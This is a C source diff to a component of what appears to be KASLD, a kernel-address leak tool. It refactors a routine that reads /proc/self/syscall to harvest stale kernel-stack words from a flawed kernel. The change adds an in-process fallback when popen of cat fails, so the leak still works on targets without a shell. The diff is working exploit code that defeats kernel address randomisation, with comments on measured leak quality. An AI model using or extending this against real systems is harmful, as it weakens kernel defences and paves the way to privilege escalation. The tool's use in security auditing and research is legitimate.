@@ -79,12 +79,52 @@ KASLD_META("method:parsed\n"
            "patch:v5.10\n"
            "config:CONFIG_HAVE_ARCH_TRACEHOOK\n");
 
-static unsigned long get_kernel_addr_proc_pid_syscall(void) {
+/* One /proc/self/syscall line into `buf`. Returns 1 on success.
+ *
+ * Preferred: `cat` is the leaker, not this process. The leaked words are the
+ * READING task's kernel stack at collect_syscall() time; a freshly exec'd cat
+ * reads at a shallower depth and yields addresses closer to _stext than an
+ * in-process read, whose stack carries libc startup and the KASLD emitter call
+ * chain. Measured: on a 32-bit arm cell cat returned a word 0x2c4 above _text
+ * where the in-process read's lowest text word sat 1.9 MiB higher.
+ *
+ * Fallback: read the file directly. popen() runs /bin/sh -c, so the preferred
+ * path needs both a shell and cat; a target with neither still leaks. Without
+ * this the component reports "no kernel address found" there — the same thing
+ * it reports on a kernel that is not vulnerable at all. The fallback recovers
+ * less, not nothing, and it goes through kasld_fopen so the read is replayable.
+ */
+static int read_syscall_line(char *buf, size_t sz, int *use_popen) {
   FILE *f;
+  char *got = NULL;
+
+  if (*use_popen) {
+    f = popen("/bin/cat /proc/self/syscall", "r");
+    if (f) {
+      got = fgets(buf, (int)sz, f);
+      pclose(f);
+      if (got)
+        return 1;
+    }
+    /* No shell, no cat, or nothing on stdout — stop paying for it every pass.
+     */
+    *use_popen = 0;
+    kasld_info("no /bin/cat via popen; reading /proc/self/syscall in-process");
+  }
+
+  f = kasld_fopen("/proc/self/syscall", "r");
+  if (!f)
+    return 0;
+  got = fgets(buf, (int)sz, f);
+  fclose(f);
+  return got ? 1 : 0;
+}
+
+static unsigned long get_kernel_addr_proc_pid_syscall(void) {
   int iterations = 10;
+  int use_popen = 1;
   unsigned long addr = 0;
   unsigned long leaked_addr = 0;
-  const char *cmd = "/bin/cat /proc/self/syscall";
   char buff[1024];
   char *ptr;
   char *endptr;
@@ -93,25 +133,10 @@ static unsigned long get_kernel_addr_proc_pid_syscall(void) {
 
   int i;
   for (i = 0; i < iterations; i++) {
-    /* cat is the leaker, not this process. The CVE leaks stale upper
-     * bytes of 64-bit arg fields from the reading process's kernel
-     * stack at collect_syscall() time; cat's stack at read(2) is
-     * shallower and empirically yields lower (closer to _stext)
-     * addresses than an in-process fopen, whose stack carries libc
-     * startup + the KASLD emitter call chain. */
-    f = popen(cmd, "r");
-    if (f == NULL) {
-      perror("[-] popen");
+    if (!read_syscall_line(buff, sizeof(buff), &use_popen)) {
+      kasld_err("could not read /proc/self/syscall");
       return 0;
     }
-
-    if (fgets(buff, sizeof(buff), f) == NULL) {
-      perror("[-] fgets");
-      pclose(f);
-      return 0;
-    }
-
-    pclose(f);
 
     /* Lazy implementation. In practice we only want data after the first 24
      * bytes (from the fifth value onwards).
